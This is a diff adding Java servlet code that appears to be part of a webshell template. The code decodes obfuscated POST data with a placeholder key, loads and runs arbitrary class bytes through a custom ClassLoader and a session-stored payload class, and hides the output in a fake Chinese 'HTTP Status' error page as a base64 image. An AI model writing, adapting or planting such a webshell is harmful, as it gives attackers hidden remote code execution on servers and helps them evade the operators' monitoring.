@@ -1,0 +1,159 @@
+
+ public static byte[] joinByteArray(byte[] byte1, byte[] byte2) {
+
+        byte[] result = new byte[byte1.length + byte2.length];
+
+        System.arraycopy(byte1, 0, result, 0, byte1.length);
+        System.arraycopy(byte2, 0, result, byte1.length, byte2.length);
+
+        return result;
+    }
+
+    public static String getBody(javax.servlet.http.HttpServletRequest request) throws java.io.UnsupportedEncodingException {
+        StringBuffer postData = new StringBuffer();
+        String bodyStr = null;
+        java.io.BufferedReader br = null;
+
+        try {
+            // 设置编码
+            request.setCharacterEncoding("UTF-8");
+            // 创建输入流
+            br = new java.io.BufferedReader(new java.io.InputStreamReader(request.getInputStream()));
+            // 获取body内容
+            String line = "";
+            StringBuffer buf = new StringBuffer();
+            while ((line = br.readLine()) != null) {
+                buf.append(line);
+            }
+            bodyStr = buf.toString();
+            String[] postStrs = bodyStr.split("&");
+            for (String postStr : postStrs) {
+                int index = postStr.indexOf("=");
+                String key = postStr.substring(0, index);
+                String value = postStr.substring(index + 1);
+                postData.append(value);
+            }
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        } finally {
+            if (br != null) {
+                try {
+                    br.close();
+                } catch (java.io.IOException e) {
+                    e.printStackTrace();
+                }
+            }
+        }
+
+        String postDataStr  = java.net.URLDecoder.decode(postData.toString(), "utf-8");
+        String regex = "[@#^()_`~<>:;\"\\'?{}]";
+        postDataStr = postDataStr.replaceAll(regex, "");
+        postData = new StringBuffer(postDataStr);
+        postData.reverse();
+        return postData.toString();
+    }
+
+
+    private static byte[] reverseByte(byte[] payloads) {
+
+        int length = payloads.length;
+        byte[] temp = new byte[length];
+
+        for (int i = length - 1; i >= 0; i--) {
+            temp[length - 1 - i] = payloads[i];
+        }
+        return temp;
+    }
+
+    private static byte[] decodePayload(byte[] payloads) {
+        int pass = {pass};
+        int length = payloads.length;
+        byte[] temp = reverseByte(payloads);
+        for (int i = 0; i < length; i += 1) {
+            payloads[i] = temp[(i + pass) % length];
+        }
+        return payloads;
+    }
+
+
+    public static String base64Encode(byte[] bs) throws Exception {
+        Class base64;
+        String value = null;
+        try {
+            base64 = Class.forName("java.util.Base64");
+            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
+            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
+        } catch (Exception e) {
+            try {
+                base64 = Class.forName("sun.misc.BASE64Encoder");
+                Object Encoder = base64.newInstance();
+                value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
+            } catch (Exception e2) {
+            }
+        }
+
+        return value;
+    }
+
+    public static String base64EncodeToStringAndPadding(byte[] bytes, int num) throws Exception {
+        String[] chars = new String[]{"@", "#", "^", "(", ")", "_", "`", "~", "?", "<", ">", ":", ";", "'", "\"", "{", "}"};
+        String base64Str = base64Encode(bytes);
+        int length = base64Str.length();
+        StringBuffer sb = new StringBuffer(base64Str);
+        while (num > 0) {
+            int randNum = new java.util.Random().nextInt(length);
+            int index = new java.util.Random().nextInt(chars.length);
+            sb.insert(randNum, chars[index]);
+            num -= 1;
+        }
+        sb.reverse();
+        String result = sb.toString();
+        return result;
+
+    }
+
+    public static String generateHtml(byte[] bytes) throws Exception {
+        String template = "<!doctype html><html lang=\"zh\"><head><title>HTTP状态</title><style type=\"text/css\">body {font-family:Tahoma,Arial,sans-serif; no-repeat center;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status</h1><hr class=\"line\" /><p><img src='data:image/png;base64,{base64}'><b>类型</b> 状态报告</p><p><b>描述</b> 源服务器未能找到目标资源的表示或者是不愿公开一个已经存在的资源表示。</p><hr class=\"line\" /></body></html>";
+        String base64Str = base64Encode(bytes);
+        return template.replace("{base64}", base64Str);
+    }
+
+
+    public static byte[] base64Decode(String bs) throws Exception {
+        Class base64;
+        byte[] value = null;
+        try {
+            base64 = Class.forName("java.util.Base64");
+            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
+            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
+        } catch (Exception e) {
+            try {
+                base64 = Class.forName("sun.misc.BASE64Decoder");
+                Object decoder = base64.newInstance();
+                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
+            } catch (Exception e2) {
+            }
+        }
+        return value;
+    }
+
+    public static void re(javax.servlet.http.HttpSession session, javax.servlet.http.HttpServletRequest request, javax.servlet.http.HttpServletResponse response, byte[] data) throws Exception {
+        request.setAttribute("parameters", data);
+        java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
+        Object f = null;
+        f = ((Class) session.getAttribute("payload")).newInstance();
+        f.equals(arrOut);
+        f.equals(data);
+        f.toString();
+        response.getWriter().write(generateHtml(arrOut.toByteArray()));
+    }
+
+    class X extends ClassLoader {
+        public X(ClassLoader z) {
+            super(z);
+        }
+
+        public Class Q(byte[] cb) {
+            return super.defineClass(cb, 0, cb.length);
+        }}
